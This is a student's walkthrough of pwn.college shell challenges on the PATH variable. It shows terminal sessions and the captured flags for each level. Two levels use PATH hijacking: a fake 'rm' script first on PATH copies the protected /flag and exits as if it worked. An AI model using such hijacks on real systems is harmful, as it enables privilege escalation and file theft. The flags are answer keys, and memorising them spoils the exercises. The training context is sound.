###Pondering PATH
This module explains us about absolute and relative paths, running the files in /challenge directory

##The Path Variable
This challenge teaches us about a shell variable, PATH, which stores bunch of directory paths in whcih the shell will search for programs correspondign to commands

#My Solve
flag: ''' pwn.college{QVwZ8MVoJFS6TSv533bXZ5sxgRQ.QX2cDM1wSNxIzNzEzW} '''

Code:
'''
hacker@path~the-path-variable:~$ ORIG_PATH="$PATH"
hacker@path~the-path-variable:~$ /bin/mkdir -p /tmp/fakebin
hacker@path~the-path-variable:~$ /bin/cat > /tmp/fakebin/rm <<'EOF'
> #!/bin/sh
if [ -e /flag ]; then
  /bin/cp -a /flag /tmp/flag.backup 2>/dev/null || /bin/echo "backup copy failed" >/dev/null
  /bin/chmod 644 /tmp/flag.backup 2>/dev/null || /bin/echo "chmod failed" >/dev/null
fi
exit 0
EOF
hacker@path~the-path-variable:~$ /bin/chmod +x /tmp/fakebin/rm
hacker@path~the-path-variable:~$ export PATH="/tmp/fakebin:$PATH"
hacker@path~the-path-variable:~$ hash -r
hacker@path~the-path-variable:~$ /bin/echo "CURRENT PATH: $PATH"
CURRENT PATH: /tmp/fakebin:/run/challenge/bin:/run/dojo/bin:/root/.cargo/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
hacker@path~the-path-variable:~$ /tmp/fakebin/rm
hacker@path~the-path-variable:~$ /challenge/run
Trying to remove /flag...
The flag is still there! I might as well give it to you!
pwn.college{QVwZ8MVoJFS6TSv533bXZ5sxgRQ.QX2cDM1wSNxIzNzEzW}
'''

#What I Learned
Things about PATH and using /challenge/run carefully so that the flag doesn't get deleted

#Reference
pwn.college
chatgpt( to understand about the challenge )

##Setting Path
This challenge teaches us how to do more tasks in PATH like adding new directory, etc.

#My Solve
flag: ''' pwn.college{ApmXFJwjwMlSDFhy-rKRDqQfhnv.QX1cjM1wSNxIzNzEzW} '''

Code: 
'''
hacker@path~setting-path:~$ PATH=/challenge/more_commands /challenge/run
Invoking 'win'....
Congratulations! You properly set the flag and 'win' has launched!
pwn.college{ApmXFJwjwMlSDFhy-rKRDqQfhnv.QX1cjM1wSNxIzNzEzW}
'''

#What I Learned
How to run a directory in PATH and use its only command.

#Reference
pwn.college

##Finding Commands
Teaches us how to find commands in so many directories like $PATH variable using which command 

#My Solve
flag: ''' pwn.college{gxHTTu43A2ZkqUYi-IOfOm78pbX.01NzEzNxwSNxIzNzEzW} '''

Code: 
'''
hacker@path~finding-commands:~$ DIR="$(dirname "$(which win)")"
hacker@path~finding-commands:~$ echo "win lives in: $DIR"
win lives in: /challenge/paths/6286
hacker@path~finding-commands:~$ ls -la /challenge/paths/6286
total 16
drwxr-xr-x  2 root root 4096 Oct  7 08:38 .
drwx--x--x 52 root root 4096 Oct  7 08:38 ..
-rw-r--r--  1 root root   61 Oct  7 08:38 flag
-rwsr-xr-x  1 root root   97 Jun  6 11:37 win
hacker@path~finding-commands:~$ readlink -f /challenge/paths/6286/flag || true
/challenge/paths/6286/flag
hacker@path~finding-commands:~$ cat /challenge/paths/6286/flag
pwn.college{gxHTTu43A2ZkqUYi-IOfOm78pbX.01NzEzNxwSNxIzNzEzW}
'''

#What I Learned
How to find commands inside a directory and listing them

#Reference
pwn.college

##Adding Commands
This challenge teaches us how to make the shell more useful for ourselves by adding our own commands

#My Solve
flag: ''' pwn.college{cPS5dgIfEx-xgFMwAcBVSzwS1J_.QX2cjM1wSNxIzNzEzW} '''

Code: 
'''
hacker@path~adding-commands:~$ /challenge/run
Invoking 'win'....
/challenge/run: line 4: win: command not found
It looks like that did not work... Did you set PATH correctly?
hacker@path~adding-commands:~$ mkdir -p "$HOME/mywin"
hacker@path~adding-commands:~$ CAT="$(command -v cat 2>/dev/null || echo /bin/cat)"
hacker@path~adding-commands:~$ printf '%s\n' '#!/bin/sh' "exec \"$CAT\" /flag" > "$HOME/mywin/win"
hacker@path~adding-commands:~$ chmod +x "$HOME/mywin/win"
hacker@path~adding-commands:~$ PATH="$HOME/mywin" /challenge/run
Invoking 'win'....
pwn.college{cPS5dgIfEx-xgFMwAcBVSzwS1J_.QX2cjM1wSNxIzNzEzW}
'''

Mistake: I wasn't able to set the PATH correctly

#What I Learned
How to add my own commands into the shell and use the previousy learned things in chain commands module

#Reference
pwn.college

##Hijacking Commands
This challenge allows us to do shananigans and is same as the first challenge, but like the previous challenge it won't print anything for me after deleting the flag using rm

#My Solve
flag: ''' pwn.college{0HHG-gs6tHkx1GO_WF6LM-EkqnK.QX3cjM1wSNxIzNzEzW} '''

Code:
'''
hacker@path~hijacking-commands:~$ ORIG_PATH="$PATH"
hacker@path~hijacking-commands:~$ /bin/mkdir -p /tmp/fakebin
hacker@path~hijacking-commands:~$ /bin/cat > /tmp/fakebin/rm <<'EOF'
> #!/bin/sh
# copy /flag to /tmp/flag.backup (if present), then chmod 644 to allow reading
if [ -e /flag ]; then
  /bin/cp -a /flag /tmp/flag.backup 2>/dev/null || /bin/echo "backup copy failed" >/dev/null
  /bin/chmod 644 /tmp/flag.backup 2>/dev/null || /bin/echo "chmod failed" >/dev/null
fi
# exit success so caller thinks rm worked
exit 0
EOF
hacker@path~hijacking-commands:~$ /bin/chmod +x /tmp/fakebin/rm
hacker@path~hijacking-commands:~$ export PATH=/tmp/fakebin:$PATH
hacker@path~hijacking-commands:~$ hash -r
hacker@path~hijacking-commands:~$ /bin/echo "CURRENT PATH: $PATH"
CURRENT PATH: /tmp/fakebin:/run/challenge/bin:/run/dojo/bin:/root/.cargo/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
hacker@path~hijacking-commands:~$ /tmp/fakebin/rm
hacker@path~hijacking-commands:~$  /challenge/run
Trying to remove /flag...
Found 'rm' command at /tmp/fakebin/rm. Executing!
hacker@path~hijacking-commands:~$ if [ -r /tmp/flag.backup ]; then
  /bin/echo "---- /tmp/flag.backup ----"
  /bin/cat /tmp/flag.backup
else
  /bin/echo "No readable /tmp/flag.backup found. Listing /tmp/flag.*:"
  /bin/ls -l /tmp/flag.* 2>/dev/null || /bin/echo "no /tmp/flag.* files"
fi
---- /tmp/flag.backup ----
pwn.college{0HHG-gs6tHkx1GO_WF6LM-EkqnK.QX3cjM1wSNxIzNzEzW}
'''

Mistake: Was not able to set up rm command properly and the flag was getting deleted

#What I Learned
Used the same stuff in first challenge and to use rm command 

#Reference
pwn.college
chatgpt( to understand about rm command and the challenge )
